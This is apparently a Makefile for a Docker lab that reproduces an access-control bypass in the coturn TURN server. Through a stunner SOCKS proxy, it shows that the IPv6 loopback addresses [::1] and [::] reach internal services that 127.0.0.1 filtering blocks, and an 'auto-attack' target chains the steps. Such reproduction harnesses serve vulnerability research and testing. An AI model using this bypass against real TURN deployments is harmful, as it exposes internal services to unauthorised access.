DOCKER_COMPOSE := $(shell command -v docker-compose 2> /dev/null || echo "docker compose")
STACK_ID := 5_coturn_access_bypass
CHECK_AVAILABLE_TAG := RTC_CHECK_AVAILABLE
DRY_RUN_TAG := RTC_DRY_RUN

SERVICE ?=
CHECK_WAIT_SEC ?= 8

run:
	@$(DOCKER_COMPOSE) up -d --remove-orphans

start: run

stop:
	@$(DOCKER_COMPOSE) down --remove-orphans

follow-coturn:
	@docker logs coturn --follow

start-stunner:
	@docker exec -it stunner sh

rebuild:
	@$(DOCKER_COMPOSE) down --rmi all --remove-orphans || true
	@$(DOCKER_COMPOSE) build --no-cache $(SERVICE)
build:
	@$(DOCKER_COMPOSE) build --no-cache $(SERVICE)

is-available:
	@echo "$(CHECK_AVAILABLE_TAG)_BEGIN stack=$(STACK_ID)"
	@$(DOCKER_COMPOSE) config -q
	@SERVICES="$$( $(DOCKER_COMPOSE) config --services )"; \
	if [ -z "$$SERVICES" ]; then \
		echo "$(CHECK_AVAILABLE_TAG)_FAIL stack=$(STACK_ID) reason=no_services"; \
		exit 1; \
	fi; \
	for SVC in $$SERVICES; do \
		CID="$$( $(DOCKER_COMPOSE) ps -q $$SVC )"; \
		if [ -z "$$CID" ]; then \
			echo "$(CHECK_AVAILABLE_TAG)_FAIL stack=$(STACK_ID) service=$$SVC reason=not_running"; \
			exit 1; \
		fi; \
		STATE="$$(docker inspect -f '{{.State.Status}}' $$CID)"; \
		if [ "$$STATE" != "running" ]; then \
			echo "$(CHECK_AVAILABLE_TAG)_FAIL stack=$(STACK_ID) service=$$SVC reason=unexpected_state state=$$STATE"; \
			exit 1; \
		fi; \
		echo "$(CHECK_AVAILABLE_TAG)_OK stack=$(STACK_ID) service=$$SVC state=$$STATE"; \
	done; \
	echo "$(CHECK_AVAILABLE_TAG)_OK stack=$(STACK_ID) all_services=running"

dry-run:
	@echo "$(DRY_RUN_TAG)_BEGIN stack=$(STACK_ID)"
	@$(MAKE) --no-print-directory coturn-http-stop >/dev/null 2>&1 || true
	@$(MAKE) --no-print-directory coturn-http-start >/dev/null
	@sleep 1
	@docker exec coturn sh -lc "curl -g -fsS --max-time 5 'http://[::1]:8000/' >/dev/null" || { \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=coturn_loopback_http reason=unreachable"; \
		exit 1; \
	}
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=coturn_loopback_http"
	@docker exec coturn sh -lc "python3 -c \"import socket; s=socket.create_connection(('127.0.0.1', 3478), 5); s.close()\"" >/dev/null 2>&1 || { \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=coturn_turn_listener reason=connection_failed"; \
		exit 1; \
	}
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=coturn_turn_listener"
	@docker exec stunner sh -lc "curl -g -fsS --max-time 8 -x socks5h://127.0.0.1:9999 'http://[::1]:8000/' >/dev/null" || { \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=stunner_socks_path reason=proxy_unusable"; \
		exit 1; \
	}
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=stunner_socks_path"
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) ready=true"

coturn-http-start:
	@echo "[*] Starting loopback HTTP server on coturn (::1:8000)..."
	@docker exec -d coturn sh -lc "python3 -m http.server 8000 --bind ::1 >/tmp/coturn-http.log 2>&1"

coturn-http-stop:
	@docker exec coturn sh -lc "ps -eo pid,args | grep 'http.server 8000 --bind ::1' | grep -v grep | awk '{print \$$1}' | xargs -r kill -TERM || true"

check-loopback-blocked:
	@echo "[*] Check 1/3: 127.0.0.1 should be blocked..."
	@if docker exec stunner sh -lc "curl -fsS --max-time 5 -x socks5h://127.0.0.1:9999 http://127.0.0.1:8000 >/tmp/check1.out 2>/tmp/check1.err"; then \
		echo "[!] FAIL: request to 127.0.0.1 unexpectedly succeeded."; \
		exit 1; \
	else \
		echo "[+] PASS: 127.0.0.1 blocked as expected."; \
	fi

check-ipv6-loopback-bypass:
	@echo "[*] Check 2/3: [::1] bypass should succeed..."
	@docker exec stunner sh -lc "curl -fsS --max-time 8 -x socks5h://127.0.0.1:9999 'http://[::1]:8000/' >/tmp/check2.out"
	@echo "[+] PASS: [::1] bypass succeeded."

check-ipv6-any-bypass:
	@echo "[*] Check 3/3: [::] bypass should succeed..."
	@docker exec stunner sh -lc "curl -fsS --max-time 8 -x socks5h://127.0.0.1:9999 'http://[::]:8000/' >/tmp/check3.out"
	@echo "[+] PASS: [::] bypass succeeded."

bypass-check:
	@$(MAKE) check-loopback-blocked
	@$(MAKE) check-ipv6-loopback-bypass
	@$(MAKE) check-ipv6-any-bypass

auto-attack: stop build start
	@echo "[*] Waiting for coturn/stunner readiness ($(CHECK_WAIT_SEC)s)..."
	@sleep $(CHECK_WAIT_SEC)
	@$(MAKE) coturn-http-stop
	@$(MAKE) coturn-http-start
	@sleep 1
	@$(MAKE) bypass-check
